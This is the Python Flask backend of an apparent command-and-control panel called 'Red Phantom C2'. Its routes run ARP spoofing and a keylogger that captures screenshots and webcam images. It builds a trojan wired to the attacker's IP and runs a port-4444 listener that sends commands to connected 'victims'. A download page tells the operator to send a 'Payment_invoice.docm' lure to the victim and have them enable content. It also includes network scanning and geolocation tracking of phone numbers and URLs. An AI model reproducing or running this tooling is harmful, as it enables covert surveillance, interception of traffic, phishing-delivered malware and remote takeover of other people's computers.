from flask import Flask, request, jsonify, send_from_directory, send_file
from core.encryption_tool import EncryptionTool
from core.keylogger import KeyloggerCore
from core.network_scanner import NetworkScanner
from core.geolocation_tracker import GeolocationTracker
from core.phone_tracker import PhoneTracker
from core.real_listener import get_real_listener
from flask_cors import CORS
import os
import subprocess
import platform
import ipaddress
import threading
import time
import socket
import sys
from core.geolocation_tracker import GeolocationTracker
import json
from datetime import datetime
from scapy.all import ARP, send
from flask_cors import CORS
import os
import urllib.parse
from datetime import datetime
import threading

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CORE_DIR = os.path.join(BASE_DIR, "core")
FRONTEND_DIR = os.path.join(BASE_DIR, "../frontend")
TEMP_DIR = os.path.join(BASE_DIR, "temp")

os.makedirs(TEMP_DIR, exist_ok=True)

app = Flask(__name__, static_folder=FRONTEND_DIR, static_url_path="")
CORS(app)

encryptor = EncryptionTool()
keylogger = KeyloggerCore()
network_scanner = NetworkScanner()
geo = GeolocationTracker(save_path=TEMP_DIR)
phone = PhoneTracker()

running = False
attack_thread = None
listener_running = False
real_listener = None

class ClientManager:
    def __init__(self):
        self.clients = {}
        
    def add_client(self, client_id, info):
        self.clients[client_id] = {
            **info,
            'connected_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'online': True
        }
        
    def remove_client(self, client_id):
        if client_id in self.clients:
            self.clients[client_id]['online'] = False
            self.clients[client_id]['disconnected_at'] = datetime.now().isoformat()
            
    def update_last_seen(self, client_id):
        if client_id in self.clients:
            self.clients[client_id]['last_seen'] = datetime.now().isoformat()

client_manager = ClientManager()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"
    

@app.route("/main")
def main_page():
    return send_file(r"D:\Delta\Level 4\Project\frontend\main-page\main.html")

def get_mac_windows(ip):
    try:
        output = subprocess.check_output(f"arp -a {ip}", shell=True, encoding="utf-8", errors="ignore")
        for line in output.split("\n"):
            if ip in line:
                parts = line.split()
                for p in parts:
                    if "-" in p and len(p) == 17:
                        return p
    except:
        pass
    return None

def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac):
    global running
    packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
    
    while running:
        try:
            send(packet1, verbose=False)
            send(packet2, verbose=False)
            time.sleep(2)
        except:
            break

@app.route("/")
def home():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/arp/start", methods=["POST"])
def arp_start():
    global running, attack_thread
    
    data = request.json
    target_ip = data.get("target_ip")
    gateway_ip = data.get("gateway_ip")
    
    if not target_ip or not gateway_ip:
        return jsonify({"success": False, "message": "Target IP and Gateway IP required"})
    
    target_mac = get_mac_windows(target_ip)
    gateway_mac = get_mac_windows(gateway_ip)
    
    if not target_mac:
        return jsonify({"success": False, "message": f"Could not find MAC for target ({target_ip})"})
    
    if not gateway_mac:
        return jsonify({"success": False, "message": f"Could not find MAC for gateway ({gateway_ip})"})
    
    running = True
    attack_thread = threading.Thread(target=arp_spoof, args=(target_ip, target_mac, gateway_ip, gateway_mac))
    attack_thread.daemon = True
    attack_thread.start()
    
    return jsonify({
        "success": True,
        "message": "ARP Spoofing Started",
        "target_mac": target_mac,
        "gateway_mac": gateway_mac
    })

@app.route("/arp/stop", methods=["POST"])
def arp_stop():
    global running
    running = False
    return jsonify({"success": True, "message": "ARP Spoofing Stopped"})

@app.post("/encrypt/file")
def encrypt_file():
    if "file" not in request.files:
        return jsonify({"success": False, "message": "No file uploaded"})
    
    file = request.files["file"]
    temp_path = os.path.join(TEMP_DIR, file.filename)
    file.save(temp_path)
    
    ok, msg = encryptor.encrypt_file(temp_path)
    return jsonify({"success": ok, "message": msg})

@app.post("/decrypt/file")
def decrypt_file():
    if "file" not in request.files:
        return jsonify({"success": False, "message": "No file uploaded"})
    
    file = request.files["file"]
    temp_path = os.path.join(TEMP_DIR, file.filename)
    file.save(temp_path)
    
    ok, msg = encryptor.decrypt_file(temp_path)
    return jsonify({"success": ok, "message": msg})

@app.post("/encrypt/folder")
def encrypt_folder():
    files = request.files.getlist("files")
    if not files:
        return jsonify({"success": False, "message": "No files uploaded"})
    
    folder_path = os.path.join(TEMP_DIR, "uploaded_folder")
    os.makedirs(folder_path, exist_ok=True)
    
    for f in files:
        file_path = os.path.join(folder_path, f.filename)
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        f.save(file_path)
    
    ok, msg = encryptor.encrypt_folder(folder_path)
    return jsonify({"success": ok, "message": msg})

@app.post("/decrypt/folder")
def decrypt_folder():
    files = request.files.getlist("files")
    if not files:
        return jsonify({"success": False, "message": "No files uploaded"})
    
    folder_path = os.path.join(TEMP_DIR, "uploaded_folder")
    os.makedirs(folder_path, exist_ok=True)
    
    for f in files:
        file_path = os.path.join(folder_path, f.filename)
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        f.save(file_path)
    
    ok, msg = encryptor.decrypt_folder(folder_path)
    return jsonify({"success": ok, "message": msg})

@app.post("/network/scan")
def network_scan():
    data = request.json
    ip_range = data.get("range")
    
    if not ip_range:
        return jsonify({"success": False, "message": "No IP range provided"})
    
    alive_hosts = []
    try:
        net = ipaddress.ip_network(ip_range, strict=False)
        param = "-n" if platform.system().lower() == "windows" else "-c"
        timeout_param = "-w" if platform.system().lower() == "windows" else "-W"
        timeout_value = "1000" if platform.system().lower() == "windows" else "1"
        
        for ip in net.hosts():
            ip_str = str(ip)
            command = ["ping", param, "1", timeout_param, timeout_value, ip_str]
            result = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                alive_hosts.append(ip_str)
        
        return jsonify({"success": True, "alive_hosts": alive_hosts})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.post("/keylogger/start")
def start_keylogger():
    ok = keylogger.start_keylogger()
    return jsonify({"success": ok, "message": "Keylogger started" if ok else "Already running"})

@app.post("/keylogger/stop")
def stop_keylogger():
    ok = keylogger.stop_keylogger()
    return jsonify({"success": ok, "message": "Keylogger stopped" if ok else "Not running"})

@app.get("/keylogger/capture")
def capture_data():
    try:
        ss_path, wc_path = keylogger.run_periodic_tasks()
        with open(keylogger.log_file_path, 'r', encoding='utf-8', errors='ignore') as f:
            log_content = f.read()
        
        return jsonify({
            "success": True,
            "logs": log_content,
            "screenshot": ss_path,
            "webcam": wc_path
        })
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

import os, json, threading, urllib.parse, ssl, socket, requests
from datetime import datetime
from flask import request, jsonify

def run_geo_scan(url, scan_id):
    parsed = urllib.parse.urlparse(url)
    domain = parsed.netloc

    geo = GeolocationTracker(save_path=TEMP_DIR)
    geo.results = {
        "target_url": url,
        "subdomains": [],
        "exposed_directories": [],
        "ssl_info": {},
        "cdn_info": {},
        "geo_data": {},
        "screenshot_path": "",
        "threat_map_path": "",
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "all_files_found": [],
        "scan_id": scan_id
    }

    geo.get_geoip_info(domain)

    geo.subdomain_enumeration(domain)

    geo.check_exposed_directories(url)

    geo.take_screenshot(url)

    geo.create_threat_map()

    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                geo.results["ssl_info"] = {
                    "protocol": ssock.version(),
                    "issuer": dict(x[0] for x in cert.get("issuer", [])),
                    "subject": dict(x[0] for x in cert.get("subject", [])),
                    "valid_from": cert.get("notBefore"),
                    "valid_to": cert.get("notAfter"),
                    "serial_number": cert.get("serialNumber")
                }
    except Exception as e:
        geo.results["ssl_info"] = {"error": str(e)}

    try:
        r = requests.get(url, timeout=5)
        headers = r.headers

        geo.results["cdn_info"] = {
            "server": headers.get("Server"),
            "via": headers.get("Via"),
            "cf_ray": headers.get("CF-RAY"),
            "cf_cache": headers.get("CF-Cache-Status"),
            "behind_cloudflare": True if headers.get("CF-RAY") else False
        }
    except Exception as e:
        geo.results["cdn_info"] = {"error": str(e)}

    result_path = os.path.join(TEMP_DIR, f"geo_result_{scan_id}.json")
    with open(result_path, "w", encoding="utf-8") as f:
        json.dump(geo.results, f, ensure_ascii=False, indent=2)


@app.route("/geo/url", methods=["POST"])
def geo_url():
    data = request.get_json()
    url = data.get("url")

    if not url:
        return jsonify({"success": False, "message": "URL required"})

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    scan_id = datetime.now().strftime("%Y%m%d%H%M%S")
    t = threading.Thread(target=run_geo_scan, args=(url, scan_id))
    t.daemon = True
    t.start()

    return jsonify({
        "success": True,
        "message": "Geo scan started",
        "scan_id": scan_id
    })


@app.route("/geo/result/<scan_id>", methods=["GET"])
def geo_result(scan_id):
    result_path = os.path.join(TEMP_DIR, f"geo_result_{scan_id}.json")
    if not os.path.exists(result_path):
        return jsonify({"success": False, "message": "Result not ready"})
    with open(result_path, "r", encoding="utf-8") as f:
        return jsonify({"success": True, "data": json.load(f)})

from flask import Flask, request, jsonify, send_from_directory
from core.phone_tracker import PhoneTracker
from flask_cors import CORS
import os

phone = PhoneTracker()

@app.route('/')
def serve_frontend():
    """خدمة الواجهة الأمامية"""
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    """خدمة الملفات الثابتة"""
    return send_from_directory(app.static_folder, path)

@app.post("/geo/phone")
def geo_phone():
    """تتبع رقم الهاتف"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "message": "No data provided"})
        
        number = data.get("number")
        if not number:
            return jsonify({"success": False, "message": "يجب إدخال رقم الهاتف"})
        
        number = str(number).strip()
        if len(number) < 5:
            return jsonify({"success": False, "message": "رقم الهاتف قصير جداً"})
        
        info = phone.track(number)
        if not info:
            return jsonify({"success": False, "message": "تعذر تحليل الرقم"})
        
        return jsonify({
            "success": True, 
            "info": info, 
            "warning": "هذه المعلومات لأغراض تعليمية فقط"
        })
        
    except Exception as e:
        print(f"Error in geo_phone: {e}")
        return jsonify({"success": False, "message": "حدث خطأ في الخادم", "error": str(e)})

@app.post("/geo/url/phone")
def geo_url_handler():
    """تتبع الرابط (وهمي للإيجاز)"""
    try:
        data = request.get_json()
        url = data.get("url", "")
        
        if not url:
            return jsonify({"success": False, "message": "يجب إدخال رابط الموقع"})
        
        info = {
            "url": url,
            "ip": "192.168.1.1",
            "location": "Cairo, Egypt",
            "host": "localhost",
            "domain": "example.com",
            "latitude": 30.0444,
            "longitude": 31.2357,
            "city": "القاهرة",
            "country": "مصر",
            "region": "Cairo",
            "zip": "11511",
            "isp": "ISP Example",
            "org": "Org Example",
            "timezone": "Africa/Cairo",
            "accuracy_km": 5
        }
        
        return jsonify({
            "success": True, 
            "info": info, 
            "warning": "هذه المعلومات لأغراض تعليمية فقط"
        })
        
    except Exception as e:
        return jsonify({"success": False, "message": "حدث خطأ", "error": str(e)})

@app.route('/map/<filename>')
def serve_map(filename):
    """خدمة ملفات الخرائط"""
    return send_from_directory(TEMP_DIR, filename)

@app.route("/api/build", methods=["POST"])
def build_trojan():
    try:
        logs = ["🚀 Starting Trojan build process..."]
        
        attacker_ip = get_local_ip()
        logs.append(f"🎯 Setting attacker IP to: {attacker_ip}")
        
        trojan_path = os.path.join(CORE_DIR, "trojan_reference.py")
        logs.append(f"📁 Trojan path: {trojan_path}")
        
        if not os.path.exists(trojan_path):
            logs.append(f"❌ Trojan file not found at: {trojan_path}")
            return jsonify({
                "success": False,
                "error": f"Trojan file not found at: {trojan_path}"
            })
        
        with open(trojan_path, 'r') as f:
            trojan_content = f.read()
        
        new_trojan_content = trojan_content.replace(
            'ATTACKER_IP = "192.168.100.5"',
            f'ATTACKER_IP = "{attacker_ip}"'
        )
        
        with open(trojan_path, 'w') as f:
            f.write(new_trojan_content)
        
        logs.append(f"✅ Trojan IP updated to: {attacker_ip}")
        
        build_py_path = os.path.join(CORE_DIR, "build.py")
        logs.append(f"📁 Build script path: {build_py_path}")
        
        if not os.path.exists(build_py_path):
            logs.append(f"❌ Build script not found at: {build_py_path}")
            return jsonify({
                "success": False,
                "error": f"Build script not found at: {build_py_path}"
            })
        
        logs.append("🔨 Running build.py...")
        
        original_cwd = os.getcwd()
        os.chdir(CORE_DIR)
        
        try:
            result = subprocess.run(
                [sys.executable, "build.py"],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            logs.append("📋 Build Output:")
            logs.append(result.stdout)
            
            if result.stderr:
                logs.append("⚠️ Warnings/Errors:")
                logs.append(result.stderr)
                
        except subprocess.TimeoutExpired:
            logs.append("⏰ Build timed out after 60 seconds")
            return jsonify({
                "success": False,
                "error": "Build process timed out"
            })
        finally:
            os.chdir(original_cwd)
        
        output_dir = os.path.join(CORE_DIR, "..", "..", "backend", "output_ready_to_send")
        if os.path.exists(output_dir):
            files = os.listdir(output_dir)
            logs.append(f"📂 Output directory: {output_dir}")
            logs.append(f"📦 Files created: {len(files)}")
            
            for file in files:
                file_path = os.path.join(output_dir, file)
                file_size = os.path.getsize(file_path) // 1024
                logs.append(f"  • {file} ({file_size} KB)")
        else:
            logs.append("⚠️ Output directory not created")
        
        return jsonify({
            "success": result.returncode == 0,
            "returncode": result.returncode,
            "output": "\n".join(logs),
            "attacker_ip": attacker_ip,
            "download_url": "/downloads/trojan"
        })
        
    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        return jsonify({
            "success": False,
            "error": str(e),
            "details": error_details
        })

@app.route("/api/listener/start", methods=["POST"])
def start_listener():
    global listener_running
    
    try:
        if listener_running:
            return jsonify({"status": "already_running", "message": "Listener is already running"})
        
        logs = ["📡 Starting listener..."]
        
        def run_listener():
            global listener_running
            listener_running = True
            try:
                result = subprocess.run(
                    [sys.executable, "listener_reference.py"],
                    cwd=CORE_DIR,
                    capture_output=True,
                    text=True
                )
                print("Listener output:", result.stdout)
                print("Listener errors:", result.stderr)
            except Exception as e:
                print(f"Listener error: {e}")
            finally:
                listener_running = False
        
        listener_thread = threading.Thread(target=run_listener, daemon=True)
        listener_thread.start()
        
        time.sleep(2)
        
        logs.append("✅ Listener started on port 4444")
        logs.append("🌐 Your IP address: " + get_local_ip())
        logs.append("📌 Waiting for victims to connect...")
        
        return jsonify({
            "success": True,
            "status": "started",
            "output": "\n".join(logs),
            "ip": get_local_ip(),
            "port": 4444
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })

@app.route("/api/listener/stop", methods=["POST"])
def stop_listener():
    global listener_running
    
    listener_running = False
    return jsonify({
        "success": True,
        "message": "Listener stopped"
    })

@app.route("/api/victims", methods=["GET"])
def get_victims():
    return jsonify({
        "clients": client_manager.clients,
        "count": len([c for c in client_manager.clients.values() if c.get('online', False)]),
        "total": len(client_manager.clients)
    })

@app.route("/api/victims/clear", methods=["POST"])
def clear_victims():
    client_manager.clients.clear()
    return jsonify({"success": True})

@app.route("/api/command", methods=["POST"])
def send_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")
    
    if not command:
        return jsonify({"error": "No command provided"})
    
    return jsonify({
        "success": True,
        "message": f"Command sent to {client_id}: {command}",
        "timestamp": datetime.now().isoformat()
    })

@app.route("/api/system/info", methods=["GET"])
def get_system_info():
    return jsonify({
        "attacker_ip": get_local_ip(),
        "listener_port": 4444,
        "listener_running": listener_running,
        "connected_clients": len([c for c in client_manager.clients.values() if c.get('online', False)]),
        "uptime": datetime.now().isoformat()
    })

@app.route("/api/command/batch", methods=["POST"])
def send_batch_commands():
    data = request.json
    commands = data.get("commands", [])
    
    results = []
    for cmd in commands:
        results.append({
            "command": cmd,
            "status": "queued",
            "timestamp": datetime.now().isoformat()
        })
    
    return jsonify({
        "success": True,
        "results": results,
        "count": len(commands)
    })

@app.route("/api/victim/connect", methods=["POST"])
def victim_connect():
    data = request.json
    client_id = f"{data['ip']}_{int(time.time())}"
    
    client_manager.add_client(client_id, {
        "ip": data['ip'],
        "hostname": data.get('hostname', 'Unknown'),
        "platform": data.get('platform', 'Unknown')
    })
    
    print(f"📥 Victim connected: {data['ip']}")
    return jsonify({"success": True, "client_id": client_id})

@app.route("/downloads/trojan")
def download_trojan():
    output_dir = os.path.join(CORE_DIR, "..", "..", "backend", "output_ready_to_send")
    
    html = """
    <html>
    <head>
        <title>Download Trojan Files</title>
        <style>
            body { background: #05060f; color: white; font-family: Arial; padding: 20px; }
            .container { max-width: 800px; margin: 0 auto; }
            .file-box { background: rgba(255,0,60,0.1); padding: 20px; margin: 10px 0; border-radius: 10px; border-left: 4px solid #ff003c; }
            .download-btn { background: #ff003c; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 5px; }
            .note { background: rgba(255,0,60,0.2); padding: 15px; border-radius: 8px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📦 Trojan Files</h1>
            <div class="note">
                <strong>📌 Instructions:</strong>
                <p>1. Download both files below</p>
                <p>2. Send them to the victim</p>
                <p>3. Start the listener from the dashboard</p>
                <p>4. Victim opens "Payment_invoice.docm" and enables content</p>
            </div>
    """
    
    if os.path.exists(output_dir):
        files = os.listdir(output_dir)
        for file in files:
            if file.endswith(('.exe', '.docm', '.docx')):
                file_path = os.path.join(output_dir, file)
                file_size = os.path.getsize(file_path) // 1024
                html += f"""
                <div class="file-box">
                    <h3>{file}</h3>
                    <p>Size: {file_size} KB</p>
                    <a class="download-btn" href="/downloads/file/{file}">⬇️ Download</a>
                </div>
                """
    
    html += """
        </div>
    </body>
    </html>
    """
    return html

@app.route("/downloads/file/<filename>")
def download_file(filename):
    output_dir = os.path.join(CORE_DIR, "..", "..", "backend", "output_ready_to_send")
    file_path = os.path.join(output_dir, filename)
    
    if os.path.exists(file_path):
        return send_from_directory(output_dir, filename, as_attachment=True)
    else:
        return "File not found", 404
    
from core.real_listener import get_real_listener

@app.route("/api/real/listener/start", methods=["POST"])
def start_real_listener():
    try:
        listener = get_real_listener()
        listener.start()
        
        return jsonify({
            "success": True,
            "message": "Real listener started",
            "ip": get_local_ip(),
            "port": 4444
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/real/clients", methods=["GET"])
def get_real_clients():
    listener = get_real_listener()
    clients = listener.get_clients_info()
    
    return jsonify({
        "success": True,
        "clients": clients,
        "count": len(clients)
    })

@app.route("/api/real/command", methods=["POST"])
def send_real_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")
    
    if not command:
        return jsonify({"success": False, "error": "No command provided"})
    
    listener = get_real_listener()
    result = listener.send_command(client_id, command)
    
    return jsonify(result)

@app.route("/api/real/responses/<client_id>", methods=["GET"])
def get_real_responses(client_id):
    listener = get_real_listener()
    responses = listener.get_responses(client_id)
    
    return jsonify({
        "success": True,
        "responses": responses
    })

def get_local_ip():
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

if __name__ == "__main__":
    print("🔥 Red Phantom C2 Server Starting...")
    print(f"📁 Base Directory: {BASE_DIR}")
    print(f"📁 Core Directory: {CORE_DIR}")
    print(f"📁 Frontend Directory: {FRONTEND_DIR}")
    print(f"📁 Temp Directory: {TEMP_DIR}")
    print(f"🌐 Server will run on: http://{get_local_ip()}:5000")
    print("🚀 Starting Flask server...")
    app.run(host="0.0.0.0", port=5000, debug=True)